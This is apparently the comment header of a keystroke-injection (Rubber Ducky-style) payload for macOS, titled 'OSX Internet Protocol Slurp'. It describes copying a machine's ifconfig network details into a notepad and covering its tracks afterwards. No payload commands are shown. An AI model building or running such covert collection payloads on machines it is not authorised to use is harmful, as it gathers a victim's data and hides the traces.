REM Title: OSX Internet Protocol Slurp
REM Author: Cameron Glass
REM Description: This payload quickly copies down information gathered from terminal's command "ifconfig" and pastes it in a notepad. This payload also quickly cleans up after itself so that you can open the notepad later and look at the information. You can also edit this payload to write it down in a text file.
